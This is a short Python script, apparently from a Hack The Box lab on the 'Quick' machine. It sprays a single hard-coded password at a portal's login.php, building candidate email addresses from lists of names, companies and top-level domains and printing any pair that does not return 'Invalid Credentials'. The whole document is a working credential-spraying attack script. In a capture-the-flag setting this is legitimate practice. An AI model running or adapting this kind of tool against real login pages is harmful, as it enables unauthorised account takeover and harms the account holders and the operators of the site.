import itertools
import requests

password='Quick4cc3$$'

def fopen(fname):
    f = open(fname, "r")
    l = f.read().split('\n')
    l.pop()
    l = map(str.strip,l)
    f.close()
    return list(l)

#f=open("words.txt", "r")
names = fopen("names.txt")
tops = fopen("tops.txt")
companies = fopen("companies.txt")

count = 0
for n in names:
    for c in companies:
        for t in tops:
            login = n + "@" + c + t
            count += 1
            url = 'http://portal.quick.htb:9001/login.php'
            body = {
                        'email': login,
                        'password': password,
                    }
            r = requests.post(url, data = body)

            if "Invalid Credentials" not in r.text:
                print("FOUND----------------------------------------:")
                print(login)
                print(password)
                break

print("done")
